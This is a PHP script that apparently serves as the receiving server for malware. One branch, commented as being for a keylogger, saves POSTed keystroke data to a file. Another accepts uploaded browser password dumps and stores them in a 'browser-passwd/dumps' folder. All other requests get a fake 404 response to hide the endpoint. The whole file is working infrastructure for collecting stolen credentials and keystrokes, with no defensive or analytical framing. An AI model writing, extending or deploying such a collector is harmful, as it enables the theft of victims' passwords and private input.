<?php

// for krylogger
if($_SERVER['REQUEST_METHOD'] == "POST" && isset($_POST['data'])){

    $data = $_POST['data'];
    file_put_contents("data.txt",$data);


}

// for browser data
elseif ($_SERVER['REQUEST_METHOD'] == "POST" && isset($_FILES['document'])) {

        if(!is_dir('../browser-passwd/dumps/')){
            mkdir('../browser-passwd/dumps/');
        }
        
        $random = date("d-h-i-s");

        $fileTmpPath = $_FILES['document']['tmp_name'];
        $fileName = $_FILES['document']['name'];
        $fileNameCmps = explode(".", $fileName);
        $fileExtension = strtolower(end($fileNameCmps));
        $newFileName = md5(time() . $fileName) . '.' . $fileExtension;
        $newPath = '../browser-passwd/dumps/'.$random."_".$fileName;
        move_uploaded_file($fileTmpPath, $newPath);
        echo "ok";
        file_put_contents("../browser-passwd/recv.txt",$random."_".$fileName);
}


else{

    header("HTTP/1.1 404 Not Found");
}   


?>